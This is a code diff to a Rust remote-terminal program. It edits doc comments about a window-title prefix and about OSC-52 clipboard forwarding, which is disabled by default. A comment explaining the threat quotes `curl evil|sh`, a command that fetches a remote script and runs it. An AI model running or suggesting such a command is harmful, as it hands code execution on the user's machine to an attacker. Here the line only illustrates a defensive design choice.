@@ -242,12 +242,12 @@ pub struct WindowState<'a> {
 #[derive(Default)]
 pub(super) struct OutOfBand {
     /// Prepended to the window title (and to the icon when icon == title) so the OS title bar shows
-    /// you're in a koh session — mosh's `[mosh] ` prefix (`$MOSH_TITLE_NOPREFIX` to disable).
-    /// Empty disables it. Compared cells stay the *raw* title, so change-detection is unaffected.
+    /// you're in a koh session — mosh's `[mosh] ` prefix. Empty disables it. Compared cells stay the
+    /// *raw* title, so change-detection is unaffected.
     title_prefix: String,
     /// Whether remote OSC-52 clipboard writes are honored. **Default OFF** (L-1): a malicious server
     /// could otherwise silently overwrite the user's system clipboard (e.g. swap a copied command
-    /// for `curl evil|sh`). Opt in with `--clipboard` / `KOH_CLIPBOARD=1`; even then the payload is
+    /// for `curl evil|sh`). Opt in with `--clipboard`; even then the payload is
     /// validated as strict base64 within the size cap before it's forwarded.
     clipboard_enabled: bool,
     /// Sticky (mosh's `title_initialized`): until the app sets a title/icon we don't touch the
@@ -299,8 +299,8 @@ impl OutOfBand {
     ) -> io::Result<()> {
         self.emit_window_title(out, win.title, win.icon)?;
         // Clipboard (OSC 52): OFF by default (L-1). A remote server must not silently overwrite the
-        // user's system clipboard. Only when the user explicitly opted in (`--clipboard` /
-        // `KOH_CLIPBOARD=1`) do we forward it — and only a strict-base64 payload within the size cap
+        // user's system clipboard. Only when the user explicitly opted in (`--clipboard`) do we
+        // forward it — and only a strict-base64 payload within the size cap
         // (the synced value is already capped client-side; we re-check defensively).
         if self.clipboard_enabled && win.clipboard != self.last_clipboard {
             self.last_clipboard = win.clipboard.to_string();
